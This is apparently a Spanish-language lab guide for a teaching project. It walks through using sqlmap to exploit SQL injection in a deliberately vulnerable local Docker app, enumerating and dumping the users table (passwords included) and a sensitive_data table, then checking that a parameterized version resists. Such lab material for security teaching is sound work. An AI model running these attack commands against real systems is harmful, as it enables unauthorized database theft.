# Guía de Ataque con sqlmap

Esta guía detalla cómo usar sqlmap para explotar la aplicación vulnerable (v1.0) y verificar que la aplicación segura (v2.0) está protegida.

## Instalación de sqlmap

### Opción 1: Instalación con pip (Windows/Linux/Mac)
```bash
pip install sqlmap
```

### Opción 2: Clonar desde GitHub
```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev
python sqlmap.py --version
```

### Opción 3: Kali Linux
sqlmap viene preinstalado en Kali Linux.

## Preparación

Asegúrate de que la aplicación vulnerable esté corriendo:

```bash
cd v1.0-vulnerable
docker-compose up -d
```

Verifica que la aplicación esté disponible en: http://localhost:5000

## Comandos de Ataque

### 1. Detección Básica de Vulnerabilidad

Prueba si el parámetro es vulnerable:

```bash
sqlmap -u "http://localhost:5000/search?username=test" --batch
```

**Flags explicados:**
- `-u`: URL objetivo
- `--batch`: Responder automáticamente a todas las preguntas con valores por defecto

### 2. Enumerar Bases de Datos

```bash
sqlmap -u "http://localhost:5000/search?username=test" --dbs --batch
```

**Salida esperada:**
```
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] userdb
```

### 3. Enumerar Tablas de una Base de Datos

```bash
sqlmap -u "http://localhost:5000/search?username=test" -D userdb --tables --batch
```

**Salida esperada:**
```
Database: userdb
[2 tables]
+----------------+
| sensitive_data |
| users          |
+----------------+
```

### 4. Enumerar Columnas de una Tabla

```bash
sqlmap -u "http://localhost:5000/search?username=test" -D userdb -T users --columns --batch
```

**Salida esperada:**
```
Database: userdb
Table: users
[5 columns]
+------------+--------------+
| Column     | Type         |
+------------+--------------+
| id         | int          |
| username   | varchar(50)  |
| email      | varchar(100) |
| password   | varchar(100) |
| created_at | timestamp    |
+------------+--------------+
```

### 5. Dump de Datos de una Tabla Específica

```bash
sqlmap -u "http://localhost:5000/search?username=test" -D userdb -T users --dump --batch
```

Este comando extraerá todos los datos de la tabla `users`, incluyendo contraseñas.

### 6. Dump Completo de la Base de Datos

```bash
sqlmap -u "http://localhost:5000/search?username=test" -D userdb --dump-all --batch
```

Este comando extraerá **TODAS** las tablas de la base de datos `userdb`, incluyendo la tabla `sensitive_data` con información confidencial.

### 7. Obtener Información del Sistema

```bash
sqlmap -u "http://localhost:5000/search?username=test" --current-user --current-db --hostname --batch
```

### 8. Ataque al Endpoint de Login

```bash
sqlmap -u "http://localhost:5000/login" --data "username=admin&password=test" --batch
```

### 9. Ataque al API Endpoint

```bash
sqlmap -u "http://localhost:5000/api/search?username=test" --batch
```

## Comandos Avanzados

### Especificar Técnica de Inyección

```bash
sqlmap -u "http://localhost:5000/search?username=test" --technique=U --batch
```

**Técnicas disponibles:**
- `B`: Boolean-based blind
- `E`: Error-based
- `U`: Union query-based
- `S`: Stacked queries
- `T`: Time-based blind
- `Q`: Inline queries

### Aumentar Nivel y Riesgo

```bash
sqlmap -u "http://localhost:5000/search?username=test" --level=5 --risk=3 --batch
```

- `--level`: 1-5 (número de pruebas a realizar)
- `--risk`: 1-3 (riesgo de las pruebas)

### Guardar Resultados

```bash
sqlmap -u "http://localhost:5000/search?username=test" -D userdb --dump-all --batch -o --output-dir=./sqlmap_results
```

### Modo Verboso

```bash
sqlmap -u "http://localhost:5000/search?username=test" --dbs -v 3 --batch
```

## Verificar Protección en v2.0

Intenta atacar la versión segura:

```bash
# Primero, levanta la versión segura
cd ../v2.0-secure
docker-compose up -d

# Intenta el ataque
sqlmap -u "http://localhost:5001/search?username=test" --dbs --batch
```

**Resultado esperado:** sqlmap NO debería poder explotar la vulnerabilidad debido a las consultas parametrizadas.

## Ejemplo de Sesión Completa de Ataque

```bash
# 1. Detectar vulnerabilidad
sqlmap -u "http://localhost:5000/search?username=test" --batch

# 2. Listar bases de datos
sqlmap -u "http://localhost:5000/search?username=test" --dbs --batch

# 3. Listar tablas
sqlmap -u "http://localhost:5000/search?username=test" -D userdb --tables --batch

# 4. Dump de tabla users
sqlmap -u "http://localhost:5000/search?username=test" -D userdb -T users --dump --batch

# 5. Dump de tabla sensitive_data
sqlmap -u "http://localhost:5000/search?username=test" -D userdb -T sensitive_data --dump --batch

# 6. Dump completo
sqlmap -u "http://localhost:5000/search?username=test" -D userdb --dump-all --batch
```

## Interpretación de Resultados

### Vulnerable (v1.0)
```
[INFO] the back-end DBMS is MySQL
[INFO] fetching database names
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] userdb
```

### Protegido (v2.0)
```
[WARNING] parameter 'username' does not seem to be injectable
[CRITICAL] all tested parameters do not appear to be injectable
```

## Limpieza

Detener los contenedores:

```bash
# Versión vulnerable
cd v1.0-vulnerable
docker-compose down

# Versión segura
cd ../v2.0-secure
docker-compose down
```

## Notas Importantes

⚠️ **ADVERTENCIA DE SEGURIDAD**

1. **Solo para fines educativos**: Estas técnicas solo deben usarse en aplicaciones que tú controlas
2. **Ilegal en sistemas ajenos**: Usar sqlmap en sistemas sin autorización es ilegal
3. **Entorno controlado**: Siempre usa estas herramientas en entornos de prueba controlados
4. **Responsabilidad**: El uso indebido de estas herramientas puede tener consecuencias legales

## Recursos Adicionales

- [Documentación oficial de sqlmap](https://github.com/sqlmapproject/sqlmap/wiki)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [sqlmap Cheat Sheet](https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet)

## Troubleshooting

### Error: "Connection refused"
- Verifica que la aplicación esté corriendo: `docker-compose ps`
- Verifica que el puerto esté correcto: `curl http://localhost:5000`

### sqlmap no detecta la vulnerabilidad
- Aumenta el nivel: `--level=5 --risk=3`
- Prueba diferentes técnicas: `--technique=BEUST`
- Usa modo verboso: `-v 3`

### Timeout errors
- Aumenta el timeout: `--timeout=30`
- Reduce el número de threads: `--threads=1`
